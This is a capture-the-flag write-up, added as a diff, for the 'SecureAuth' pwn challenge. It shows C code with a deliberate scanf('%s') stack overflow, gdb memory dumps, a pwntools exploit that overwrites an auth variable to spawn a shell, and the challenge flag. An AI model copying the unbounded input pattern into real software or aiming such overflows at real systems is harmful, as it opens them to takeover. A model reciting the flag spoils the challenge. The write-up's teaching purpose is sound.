@@ -1,0 +1,72 @@
+title: SecureAuth
+id: 1079
+category: Pwn
+difficulty: Easy
+content: |
+**Author**: [Srijith](https://twitter.com/__k1R4)
+
+#### Initial Analysis
+
+This is the main function taken from source code. We have 2 variables, `username` which is a `char` buffer of size 8, and `auth` of type `int`. `auth` is initialised with the value `0xcafebabe`. User input is read using `scanf` with the format specifier `%s`. Our goal is to overwrite `auth` to have value `0xdeadbeef` which will result in us getting a shell, which we can use to obtain the flag.
+```c
+int main(int argc, char *argv[]){
+  init();
+
+  char username[8];
+  int auth = 0xcafebabe;
+  puts("Welcome to the most Secure Authorization service!");
+  printf("Enter your username: ");
+  scanf("%s",&username);
+
+  if (auth == 0xdeadbeef){
+    puts("NO! How did you bypass me?!");
+    system("/bin/sh");
+  }
+
+  puts("You can't fool me (¬_¬)");
+  exit(0);
+}
+```
+
+#### Exploitation
+
+The vulnerability here is caused by using the format specifier `%s` with `scanf`. The issue with this particular format specifier is that it reads input of any size and stores it in a buffer of fixed size. This may cause a buffer overflow, if input size exceeds the size of the buffer. 
+
+In this particular challenge this vulnerability allows us to write past the memory allocated for `username` and into `auth`. This allows us to modify the value of `auth`. We can test the overflow by debugging the binary with `gdb` and giving an input such as `AAAAAAAABBBB`. The first 8 "A"s will fill the `username` buffer. The remaining "B"s will overwrite 0xcafebabe stored in `auth`.
+
+Before reading input:
+```
+pwndbg> x/3wx $rbp-12
+0x7fffffffe874: 0x00007fff  0x00000000  0xcafebabe
+                |--------username--------|      |--auth--|
+```
+
+After reading input:
+```
+pwndbg> x/3wx $rbp-12
+0x7fffffffe874: 0x41414141  0x41414141  0x42424242
+                |--------username--------|      |--auth--|
+```
+
+`0x41` is the hexadecimal ASCII value of "A" and `0x42` is the hexadecimal ASCII value of "B". Hence it can be seen that we overwrote `auth` with our "B"s.
+Since data is stored in `little endian` (reverse order for every 4 bytes), in order to get `0xdeadbeef` in memory, we have to give input `"\xef\xbe\xad\xde"`.
+
+Final exploit:
+```py
+from pwn import *
+
+p = process("./SecureAuth")
+p.sendlineafter("username: ","A"*8+"\xef\xbe\xad\xde")
+p.sendlineafter("?!\n", "cat flag.txt")
+p.interactive()
+```
+
+#### Conclusion
+
+In summary,
+- we have 2 variables, `username` which is a `char` buffer and `auth` which is an `int` with value `0xcafebabe`.
+- use buffer overflow caused by `scanf` to fill `username` buffer and overwrite `auth` to `0xdeadbeef`.
+- check is passed and we are given a shell with which flag can be obtained.
+
+
+**Flag**: inctfj{v4riabl3_0verwr1te_t0_4uth3nticat3}
